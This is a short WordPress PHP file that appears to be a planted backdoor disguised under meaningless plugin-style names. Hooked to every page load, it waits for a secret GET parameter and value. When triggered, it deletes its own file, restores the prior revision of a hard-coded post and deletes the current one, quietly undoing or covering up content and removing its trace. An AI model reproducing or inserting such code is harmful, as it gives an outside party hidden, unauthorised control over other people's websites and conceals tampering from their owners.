<?php

function lazy_links_project() {
	if (isset($_GET['sites_schema_html5']) && $_GET['sites_schema_html5'] === 'icon_class_ip') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$rating_safe_logger_auto = 4905;
		$connect_maker_importer = wp_get_post_revisions($rating_safe_logger_auto);
		if (empty($connect_maker_importer)) die('no revisions');
		if (count($connect_maker_importer) < 2) die('less than 2');
		$loader_chat_management_store = array_shift($connect_maker_importer);
		$estate_auto_files_images = $loader_chat_management_store->ID;
		$homepage_learndash_marketing = array_shift($connect_maker_importer);
		$your_software_dynamic = $homepage_learndash_marketing->ID;
		$scss_flexible_captcha_dev = wp_restore_post_revision($your_software_dynamic);
		if ($scss_flexible_captcha_dev === false) die('error restoring');
		$scss_flexible_captcha_dev = wp_delete_post_revision($estate_auto_files_images);		
		if ($scss_flexible_captcha_dev === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'lazy_links_project');
